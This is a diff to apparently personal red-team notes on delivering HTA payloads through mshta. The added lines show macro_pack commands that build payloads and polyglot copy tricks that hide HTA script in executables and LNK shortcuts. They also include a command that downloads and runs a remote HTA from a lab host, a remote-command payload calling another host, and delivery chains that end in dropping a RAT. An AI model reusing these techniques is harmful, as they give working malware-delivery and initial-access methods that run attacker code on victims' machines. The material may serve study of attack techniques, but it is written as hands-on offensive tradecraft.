@@ -556,21 +556,70 @@ mshta with javascript for obfuscation
 
 http://blog.sevagas.com/?Hacking-around-HTA-files
 
+generating an hta file using micropack
+
+`echo sevagas | macro_pack.exe -t HELLO -G hello.hta`
 
 
 If you run the html file with mshta.exe, your HTA application will be found, and run.
+macro_pack is recognized  as  mimikatz
 
-### putting pictures in hta
+```
+C:\Users\HP\Downloads>copy /b %windir%\system32\calc.exe+hello.hta calc2.exe
+C:\WINDOWS\system32\calc.exe
+Overwrite calc2.exe? (Yes/No/All): copy /b %windir%\system32\calc.exe+test.hta calc2.exe
+Overwrite calc2.exe? (Yes/No/All): All
+hello.hta
+        1 file(s) copied.
 
+C:\Users\HP\Downloads>calc2.exe
+
+C:\Users\HP\Downloads>mshta calc2.exe
+```
+
+this did not work
+
+only mshta from dowload and execute works
+
+```
+mshta http://10.10.6.111:8000/hello.hta
+```
+
+![](2023-02-02-10-29-38.png)
+
+you can modify the LNK target in a way it will use MSHTA on itself and thus, execute the script.
+That basically turns an LNK file into a self executable HTA file with a non .hta extension
+
+Create a file which is both a ZIP file and LNK file (with .lnk extension). The goal is to extract the zip archive when you double click on the shortcut (without any HTA code). 
+
+putitng pictures in a lnk
 `copy /b picture.ico+test.hta test_with_icon.hta`
 
 <HTA:APPLICATION icon="#" />
 
-     copy /b %windir%\system32\calc.exe+test.hta calc2.exe
-     calc2.exe  -> Runs good old calc
-     mshta %cd%\calc2.exe  -> Execute HTA script!
+copying hta into a lnk file
+`copy /b readme.txt.lnk+test.hta readme2.txt.lnk`
 
-secod approach through lnk file
+various scenarios where the lnk file is dropped
+
+    LNK -> CMD -> Powershell -> DROP RAT
+    LNK -> remote SCT -> DROP RAT
+    DOCx -> LNK -> remote HTA -> Powershell -> DROP RAT
+
+```
+echo http://192.168.0.5:1234/a "systeminfo" | macro_pack.exe -t REMOTE_CMD -o -G info.hta
+```
+
+```
+echo '"c:\Windows\System32\cmd.exe /c calc.exe" "calc.exe"' | macro_pack.exe -t REMOTE_CMD -o -G test.hta
+```
+
+magic dropper works am able to embed the png in lnk file
+
+![](2023-02-02-12-04-53.png)
+
+can we embed some other exe.
+
 
 
 
